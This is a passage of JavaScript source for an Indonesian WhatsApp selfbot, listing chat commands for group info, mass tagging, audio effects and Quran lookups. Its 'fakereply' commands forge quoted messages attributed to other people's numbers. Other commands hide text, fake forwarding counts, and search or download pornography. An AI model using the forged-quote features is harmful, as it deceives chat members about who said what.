                    fakestatus(`*Succes Create Group ${namegc}*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'infogc':
               case 'groupinfo':
               case 'infogroup':
                    const antl = antilink.includes(from)
                    const wlkm = welkom.includes(from)
                    const prmdm = promdem.includes(from)
                    const asyui = antidelete.includes(from)
                    a = '```'
                    try {
                    ppUrl = await riyan.getProfilePicture(from)
                    } catch {
                    ppUrl = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                    buffer = await getBuffer(ppUrl)
                    send = `${groupOwner.split("@")[0]}@s.whatsapp.net`
                    send2 = `${groupDescOwner.split("@")[0]}@s.whatsapp.net`
                    send3 = `${groupSubOwner.split("@")[0]}@s.whatsapp.net`
                    teks = `Information Group *${groupName}*

Group ini di dirikan sejak *${groupCreate}* Pukul *${pukul}* oleh @${send.split("@")[0]}
₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋
● ${a}Total Member :${a} *${groupMembers.length}*
● ${a}Total Admin :${a} *${groupAdmins.length}*
● ${a}Antilink Status :${a} *${antl ? 'Aktif' : 'Nonaktif'}*
● ${a}Welcome Status :${a} *${wlkm ? 'Aktif' : 'Nonaktif'}*
● ${a}Promdem Status :${a} *${prmdm ? 'Aktif' : 'Nonaktif'}*
● ${a}Antidelete Status :${a} *${asyui ? 'Aktif' : 'Nonaktif'}*
● ${a}Bot Group Admins :${a} *${isBotGroupAdmins}*
⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻
● ${a}Deskripsi Group :${a}
${groupDesc}
⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻
Subject di update oleh @${send3.split("@")[0]} pada *${groupSTime}* Pukul *${pukul3}*
Desc di update oleh @${send2.split("@")[0]} pada *${groupDTime}* Pukul *${pukul2}*
⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻
*_ʏᴀɴɴᴢ ʙᴏᴛ ɢʀᴏᴜᴘ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ_*`
                    riyan.sendMessage(from, buffer, image, {quoted: yan, caption: teks, contextInfo:{mentionedJid: [send, send2, send3]}})
                    break
               case 'groupcek':
               case 'cekgroup':
                    kntl = antilink.includes(from)
                    meck = welkom.includes(from)
                    ngntd = promdem.includes(from)
                    asyuo = antidelete.includes(from)
                    a = '```'
                    teks = `Cek Group *${groupName}*
₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋₋
● ${a}Total Member :${a} *${groupMembers.length}*
● ${a}Total Admin :${a} *${groupAdmins.length}*
● ${a}Antilink Status :${a} *${kntl ? 'Aktif' : 'Nonaktif'}*
● ${a}Welcome Status :${a} *${meck ? 'Aktif' : 'Nonaktif'}*
● ${a}Promdem Status :${a} *${ngntd ? 'Aktif' : 'Nonaktif'}*
● ${a}Antidelete Status :${a} *${asyuo ? 'Aktif' : 'Nonaktif'}*
● ${a}Bot Group Admins :${a} *${isBotGroupAdmins}*
⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻⁻
*_ʏᴀɴɴᴢ ʙᴏᴛ ɢʀᴏᴜᴘ ᴄʜᴇᴄᴋ_*`
                    riyan.sendMessage(from, teks, text, {quoted: yan})
                    break
               case 'del':
               case 'delete':
                    riyan.deleteMessage(from, { id: yan.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
                    break
               case 'chat':
                    if (yanz.length < 1) return reply(`Lu mau ngirim pesan ke setan?`)
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    var pc = body.slice(6)
                    var nomor = pc.split("|")[0];
                    var org = pc.split("|")[1];
                    if (yan.message.extendedTextMessage != undefined) {
                    riyan.sendMessage(`${mentionUser}`, org, text)
                    send = `${mentionUser}`
                    fakestatus2(`Berhasil mengirimkan pesan ke nomor @${mentionUser[0].split("@")[0]}`, cr, text, thumbnail, send)
                    } else {
                    riyan.sendMessage(nomor+'@s.whatsapp.net', org, text)
                    fakestatus(`Berhasil mengirimkan pesan ke nomor ${nomor}`, cr, text, thumbnail)
                    }
                    break
               case 'tahta':
               case 'harta':
                    tahta = `${body.slice(7)}`
                    if (yanz.length < 1) return reply('Text?')
                    if (yanz.length > 6) return reply('Text maximal 6')
                    buff = await getBuffer(`https://naufalhoster.xyz/textmaker/harta_tahta?apikey=${nopal}&text=${tahta}`, {method: 'get'})
                    riyan.sendMessage(from, buff, image, {caption: `Harta Tahta ${tahta}`})
                    break
               case 'runtime':
                    runtime6 = process.uptime()
                    run6 = `*-[ BOT AKTIF ]-*\n${kyun(runtime6)}`
                    riyan.sendMessage(from, run6, text, {
                    quoted: {
                    key: {
                    fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {
                    remoteJid: "status@broadcast"
                    }: {})
                    }, message: {"imageMessage": {"caption": "*𝐑𝐔𝐍𝐓𝐈𝐌𝐄*", "jpegThumbnail": fs.readFileSync('./strg/image/riyan.jpg')}}}})
                    break
               case 'readmore':
                    more = String.fromCharCode(8206)
                    readmore = more.repeat(4001)
                    var kls = body.slice(10)
                    var has = kls.split("|")[0];
                    var kas = kls.split("|")[1];
                    reply(`${has}`+readmore+`${kas}`)
                    break
               case 'readall':
                    a = '```'
                    var chats = await riyan.chats.all()
                    chats.map( async ({ jid }) => {
                    await riyan.chatRead(jid)
                    })
                    teks = `${a}Successfully read ${chats.length} chats !${a}`
                    await riyan.sendMessage(from, teks, text, {quoted: freply})
                    console.log(chats.length)
                    break
               case 'unreadall':
                    a = '```'
                    var chats = await riyan.chats.all()
                    chats.map( async ({ jid }) => {
                    await riyan.chatRead(jid, "unread")
                    })
                    var teks = `${a}Successfully unread ${chats.length} chats !${a}`
                    riyan.sendMessage(from, teks, text, {quoted: freply})
                    console.log(chats.length)
                    break
               case 'fakereply':
                    var gh = body.slice(11)
                    var replace = gh.split("|")[0];
                    var target = gh.split("|")[1];
                    var bot = gh.split("|")[2];
                    if (yan.message.extendedTextMessage != undefined) {
                    riyan.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentionUser}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
                    } else {
                    riyan.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: replace+'@s.whatsapp.net', ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
                    }
                    break
               case 'fakereply2':
                    var gh = body.slice(12)
                    var replace = gh.split("|")[0];
                    var target = gh.split("|")[1];
                    var bot = gh.split("|")[2];
                    if (yan.message.extendedTextMessage != undefined) {
                    riyan.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentionUser}`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${target}` }}})
                    } else {
                    riyan.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: replace+'@s.whatsapp.net', ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${target}` }}})
                    }
                    break
               case 'pornhub':
                    if (yanz.length < 1) return reply('mau cari apa um?')
                    teks = body.slice(9)
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/pornhubsearch?apikey=${lol}&query=${teks}`, {method: 'get'})
                    teks = `*PORNHUB - SEARCH*\n\n__________________________\n\n`
                    for (let bokep of anu.result) {
                    teks += `Title : ${bokep.title}\nPengunggah : ${bokep.uploader}\nDurasi : *${bokep.duration}*\nLink: ${bokep.link}\n__________________________\n\n`
                    }
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(teks.trim(), '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'xnxx':
                    if (yanz.length < 1) return reply('mau cari apa um?')
                    teks = body.slice(6)
                    cr7 = '_*XNXX - SEARCH*_'
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/xnxxsearch?apikey=${lol}&query=${teks}`, {method: 'get'})
                    teks = `*XNXX - SEARCH*\n\n__________________________\n\n`
                    for (let bokep of anu.result) {
                    teks += `Title : ${bokep.title}\nPengunggah : ${bokep.uploader}\nDurasi : *${bokep.duration}*\nLink: ${bokep.link}\n__________________________\n\n`
                    }
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(teks.trim(), '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'timer':
                    tm = '_*TIMER - SETTIME*_'
                    if (yanz[1]=="detik") {var timer = yanz[0]+"000"
                    } else if (yanz[1]=="menit") {var timer = yanz[0]+"0000"
                    } else if (yanz[1]=="jam") {var timer = yanz[0]+"00000"
                    } else {return reply("*pilih:*\ndetik\nmenit\njam")}
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`Waktu dimulai dari sekarang`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    setTimeout( () => {
                    reply("Waktu habis")
                    }, timer)
                    break
               case 'hitungmundur':
                    var countDownDate = new Date(`${yanz.join(' ')} 00:00:00`).getTime();
                    var now = new Date().getTime();
                    var distance = countDownDate - now;
                    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
                    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
                    reply(`${days} hari ${hours} jam ${minutes} menit ${seconds} detik`)
                    break
               case 'hidetag':
                    var value = body.slice(9)
                    var group = await riyan.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    riyan.sendMessage(from, value, text, {contextInfo: {
                        mentionedJid: mem}
                    })
                    break
               case 'imagetag':
                    var group = await riyan.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    hehe = fs.readFileSync('./strg/image/ranime2.jpeg')
                    riyan.sendMessage(from, hehe, image, {contextInfo: {
                        mentionedJid: mem}, thumbnail: hehe, quoted: yan, caption: 'by : @yannnnn.zz_'
                    })
                    break
               case 'stickertag':
               case 'stikertag':
                    var group = await riyan.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    buff = fs.readFileSync('./strg/stiker/yahh.webp')
                    riyan.sendMessage(from, buff, sticker, {contextInfo: {
                        mentionedJid: mem}, quoted: yan
                    })
                    break
               case 'tohidetag':
                    var group = await riyan.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    if (isMedia && !yan.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption || isQuotedImage) {
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    buff = fs.readFileSync(media)
                    teks = yan.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption
                    riyan.sendMessage(from, buff, image, {contextInfo: {mentionedJid: mem}, quoted: yan, caption: teks})
                    fs.unlinkSync(media)
                    } else if (isMedia && !yan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.caption || isQuotedVideo) {
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    buff = fs.readFileSync(media)
                    teks = yan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.caption
                    riyan.sendMessage(from, buff, video, {contextInfo: {mentionedJid: mem}, quoted: yan, caption: teks})
                    fs.unlinkSync(media)
                    } else if (isMedia && !yan.message.videoMessage || isQuotedImage || isQuotedSticker || isQuotedVideo) {
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    buff = fs.readFileSync(media)
                    ini_type = image
                    if (media.includes(".mp4")) ini_type = video
                    if (media.includes(".webp")) ini_type = sticker
                    riyan.sendMessage(from, buff, ini_type, {contextInfo: {mentionedJid: mem}, quoted: yan})
                    fs.unlinkSync(media)
                    } else if (isMedia && !yan.message.videoMessage || isQuotedAudio) {
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    buff = fs.readFileSync(media)
                    riyan.sendMessage(from, buff, audio, {mimetype: 'audio/mp4', ptt: true, contextInfo: {mentionedJid: mem}, quoted: yan})
                    fs.unlinkSync(media)
                    } else {
                    teks = yan.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                    riyan.sendMessage(from, teks, text, {contextInfo: {mentionedJid: mem}, quoted: yan})
                    }
                    break
               case 'tagme2':
                    me = riyan.user
                    const xexe = {
                    text: `@${me.jid.split('@')[0]}`,
                    contextInfo: { mentionedJid: [me.jid] }
                    }
                    var group = await riyan.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    riyan.sendMessage(from, xexe, text, {contextInfo: {
                    mentionedJid: mem}, quoted: yan
                    })
                    break
               case 'audiotag':
                    var group = await riyan.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    buff = fs.readFileSync('./strg/audio/ahh.mp3')
                    riyan.sendMessage(from, buff, audio, {mimetype: 'audio/mp4', ptt: true, contextInfo: {
                        mentionedJid: mem}, quoted: yan
                    })
                    break
               case 'kontag':
                    tag = body.slice(8)
                    nom = tag.split("|")[0]
                    nam = tag.split("|")[1]
                    var group = await riyan.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    if (yan.message.extendedTextMessage != undefined) {
                    mentioned = yan.message.extendedTextMessage.contextInfo.mentionedJid
                    vcardx = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + `FN:${nam}\n` + 'ORG:Kontak;\n' + `TEL;type=CELL;type=VOICE;waid=${mentioned[0].split("@")[0]}:${mentioned[0].split("@")[0]}\n` + 'END:VCARD'
                    riyan.sendMessage(from, {displayname: "Jeff", vcard: vcardx}, MessageType.contact, {contextInfo: {
                        mentionedJid: mem}
                    })
                    } else {
                    vcardxx = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + `FN:${nam}\n` + 'ORG:Kontak;\n' + `TEL;type=CELL;type=VOICE;waid=${nom}:${nom}\n` + 'END:VCARD'
                    riyan.sendMessage(from, {displayname: "Jeff", vcard: vcardxx}, MessageType.contact, {contextInfo: {
                        mentionedJid: mem}, quoted: yan
                    })}
                    break
               case 'kontak':
                    argz = arg.split('|')
                    if (!argz) return reply(`Penggunaan ${prefix}kontak @tag atau nomor|nama`)
                    if (yan.message.extendedTextMessage != undefined) {
                    mentioned = yan.message.extendedTextMessage.contextInfo.mentionedJid
                    wa.sendKontak(from, mentioned[0].split('@')[0], argz[1])
                    } else {
                    wa.sendKontak(from, argz[0], argz[1])
                    }
                    break
               case 'rptag':
                    if (yan.message.extendedTextMessage === undefined || yan.message.extendedTextMessage === null) return reply("Gada yang di tag")
                    mentioned = yan.message.extendedTextMessage.contextInfo.mentionedJid
                    jumlah = yanz[1]
                    teks = "*Repeat Tag*"
                    teks += "\n\n"
                    members_id = []
                    for (let z = 0; z < `${jumlah}`; z++) {
                        teks += ` @${mentioned[0].split("@")[0]}`
                        members_id.push(mentioned[0])
                    }
                    mentions(teks, members_id, true)
                    break
               case 'speed':
                    const n = '```'
                    const timestamp2 = speed();
                    const latensi2 = speed() - timestamp2
                    const pingnya2 = `${n}Speed:${n}\n${n}◪ ${latensi2.toFixed(4)} Second${n}`
                    riyan.sendMessage(from, pingnya2, text, {
                         quoted: {
                         key: {
                         fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {
                         remoteJid: "status@broadcast"
                         }: {})
                         }, message: {"imageMessage": {"caption": "*𝐘𝐀𝐍𝐍𝐙 𝐒𝐄𝐋𝐅𝐁𝐎𝐓*", "jpegThumbnail": fs.readFileSync('./strg/image/riyan.jpg')}}}})
                    break
               case 'url2':
                    if (yanz.length == 0) return reply(`Pilih Tipe Apa Om?\n- pic = _convert url to picture_\n- vid = _convert url to video_\n- stik = _convert url to sticker_\n- aud = _convert url to audio_\n- ptt = _convert url to ptt_\nExample: ${prefix + command} pic https://i.ibb.co/P4vtTFQ/2d72760ce736.jpg`)
                    url = `${yanz[1]}`
                    if (yanz[0] === 'pic') {
                    buff = await getBuffer(url)
                    riyan.sendMessage(from, buff, image, {quoted: yan})
                    } if (yanz[0] === 'vid') {
                    buff = await getBuffer(url)
                    riyan.sendMessage(from, buff, video, {quoted: yan})
                    } if (yanz[0] === 'stik') {
                    buff = await getBuffer(url)
                    riyan.sendMessage(from, buff, sticker, {quoted: yan})
                    } if (yanz[0] === 'aud') {
                    buff = await getBuffer(url)
                    riyan.sendMessage(from, buff, audio, {quoted: yan, mimetype: 'audio/mp4', filename: `Yanz.mp3`, quoted: yan})
                    } if (yanz[0] === 'ptt') {
                    buff = await getBuffer(url)
                    riyan.sendMessage(from, buff, audio, {quoted: yan, mimetype: 'audio/mp4', quoted: yan, ptt:true})
                    }
                    break
               case 'xndl':
                    if (yanz.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = yanz.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxx?apikey=${lol}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    buff = await getBuffer(get_result.thumbnail)
                    riyan.sendMessage(from, buff, image, { quoted: yan, caption: ini_txt })
                    break
               case 'phdl':
                    if (yanz.length < 1) return reply('Link nya mna um?')
                    data = await fetchJson(`https://naufalhoster.xyz/dl/pornhub?apikey=${nopal}&url=${body.slice(6)}`)
                    ph = data.result
                    teksph = `*Pornhub Downloader*\n\n*Ttile :* ${ph.title}\n\n*Duration :* ${ph.duration}\n\n*Link download :* ${ph.media[0].url}`
                    buff = await getBuffer(ph.thumbnail)
                    riyan.sendMessage(from, buff, image, {quoted: yan, caption: teksph})
                    break
               case 'pinterest':
                    pin = body.slice(11)
                    pok = await getBuffer(`https://lindow-api.herokuapp.com/api/pinterest?search=${pin}&apikey=${apilin}`)
                    riyan.sendMessage(from, pok, image, { quoted: yan, caption: `*PINTEREST!*\n\nHasil pencarian dari : *${pin}*`})
                    break
               case 'setstatus':
               case 'setbio':
                    if (yanz.length < 1) return reply('Status nya apa sayang?')
                    riyan.setStatus(`${q}`)
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Succes change status to : ${q}*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'setname':
               case 'upname':
                    if (yanz.length < 1) return reply('Mau di namain apa sayang?')
                    riyan.updateProfileName(`${q}`)
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`*Succes change name to ${q}*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'blocklist':
               case 'listblock':
                    teks = 'Block List :\n'
                    for (let block of blocked) {
                    teks += `┣➢ @${block.split('@')[0]}\n`
                         }
                    teks += `𝗧𝗼𝘁𝗮𝗹 : ${blocked.length}`
                    riyan.sendMessage(from, teks.trim(), extendedText, {quoted: yan, contextInfo: {"mentionedJid": blocked}})
                    break
               case 'fordward':
                    fd = body.slice(10)
                    angka = fd.split("|")[0]
                    teks = fd.split("|")[1]
                    riyan.sendMessage(from, teks, MessageType.text, {contextInfo: { forwardingScore: angka, isForwarded: true }})
                    break
               case 'translate':
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    var tr = body.slice(11)
                    var kode = tr.split("|")[0];
                    var query = tr.split("|")[1];
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/translate/auto/${kode}?apikey=${lol}&text=${query}`, {method: 'get'})
                    teks = `● *Teks :* ${anu.result.original} (${anu.result.from})\n● *Translated :* ${anu.result.translated} (${anu.result.to})`
                    fakestatus(teks, '𝙏𝙍𝘼𝙉𝙎𝙇𝘼𝙏𝙀 - 𝙏𝙊𝙊𝙇𝙎', text, thumbnail)
                    break
               case 'igstalk':
                    name = body.slice(9)
                    anu = await fetchJson(`https://api.zeks.xyz/api/igstalk?apikey=${apiZeks}&username=${name}`)
                    teks = `*Username :* ${anu.username}\n*Fullname :* ${anu.fullname}\n*Followers :* ${anu.follower}\n*Following :* ${anu.following}\n*Verified :* ${anu.is_verified}\n*Private :* ${anu.is_private}\n*Biography :* ${anu.bio}`
                    buff = await getBuffer(anu.profile_pic)
                    riyan.sendMessage(from, buff, image, {quoted: yan, caption: teks})
                    break
               case 'toptt':
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.mp3')
                    exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return reply('Gagal mengkonversi audio ke ptt')
                    topt = fs.readFileSync(ran)
                    riyan.sendMessage(from, topt, audio, {mimetype: 'audio/mp4',  ptt:true})
                    fs.unlinkSync(ran)
                    })
                    break
               case 'slowmo':
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.mp3')
                    exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media)
                    if (err) return reply('Error!')
                    uhh = fs.readFileSync(ran)
                    riyan.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: yan})
                    fs.unlinkSync(ran)
                    })
                    break
               case 'tupai':
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.mp3')
                    exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    riyan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: yan})
                    fs.unlinkSync(ran)
                    })
                    break
               case 'gemuk':
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.mp3')
                    exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    riyan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: yan})
                    fs.unlinkSync(ran)
                    })
                    break
               case 'bass':
                    encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    media = await riyan.downloadAndSaveMediaMessage(encmedia)
                    ran = getRandom('.mp3')
                    exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media)
                    if (err) return reply('Error!')
                    hah = fs.readFileSync(ran)
                    riyan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: yan})
                    fs.unlinkSync(ran)
                    })
                    break
               case 'brainly':
                    brien = body.slice(9)
                    brainly(`${brien}`).then(res => {
                    teks = '\n────────────\n'
                    for (let Y of res.data) {
                    teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
                    }
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(teks, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    console.log(res)
                    })
                    break
               case 'alquran':
                    if (yanz.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                    urls = `https://api.lolhuman.xyz/api/quran/${q}?apikey=${lol}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    reply(ini_txt)
                    break
               case 'listsurah':
                    teks = (list(surah))
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(teks, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    break
               case 'ayataudio':
                    if (yanz.length < 1) return reply(`Usage: _${prefix}ayataudio Ayat_\nExample: _${prefix}ayataudio 18_`)
                    txt = body.slice(10)
                    var surah = txt.split("|")[0];
                    var ayat = txt.split("|")[1];
                    buff = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${surah}/${ayat}?apikey=${lol}`)
                    riyan.sendMessage(from, buff, audio, { mimetype: 'audio/mp4', quoted: yan, ptt: true })
                    break
               case 'surahaudio':
                    if (yanz.length < 1) return reply(`Usage: _${prefix}surahaudio nomorSurah|Ayat_\nExample: _${prefix}surahaudio 18_`)
                    thumbnail = fs.readFileSync('./strg/image/ranime2.jpeg')
                    fakestatus(`_Mungkin fitur ini membutuhkan waktu lama untuk mengirim audio, harap sabar menunggu.._`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, thumbnail)
                    buff = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${q}?apikey=${lol}`)
                    riyan.sendMessage(from, buff, audio, { mimetype: 'audio/mp4', quoted: yan, ptt: true })
                    break
               case 'asmaulhusna':
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asmaulhusna?apikey=${lol}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    break
                case 'kisahnabi':
                    if (yanz.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = yanz.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${lol}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    reply(ini_txt)
                    break
               case 'quotes':
                    anu = await fetchJson(`http://api.lolhuman.xyz/api/random/quotes?apikey=${lol}`)
                    teks = `❝${anu.result.quote}❞\n\n  _quotes by ${anu.result.by}_`
                    riyan.sendMessage(from, teks, text, {quoted: yan})
                    break
               case 'quoteislam':
                    anu = await fetchJson(`https://h4ck3rs404-api.herokuapp.com/api/randomquote/muslim?apikey=404Api`)
                    teks = `${anu.result.text_id}\n\n  _quotes by Yanz_`
                    reply(teks)
                    break
               case 'katabijak':
                    anu = await fetchJson(`https://h4ck3rs404-api.herokuapp.com/api/katabijak?apikey=404Api`)
                    teks = `❝${anu.result}❞`
                    reply(teks)
